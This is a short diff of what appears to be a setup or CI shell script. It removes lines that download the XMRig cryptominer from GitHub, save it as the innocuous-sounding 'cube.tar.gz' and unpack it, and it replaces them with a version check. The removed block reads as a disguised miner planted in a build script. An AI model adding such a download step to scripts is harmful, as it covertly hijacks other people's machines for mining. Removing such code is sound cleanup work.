@@ -6,8 +6,4 @@ which curl
 which npm 
 which node
 which wget
-pwd
-curl https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz > cube.tar.gz
-ls
-tar -xvzf cube.tar.gz
-ls
+clam/pearl --version
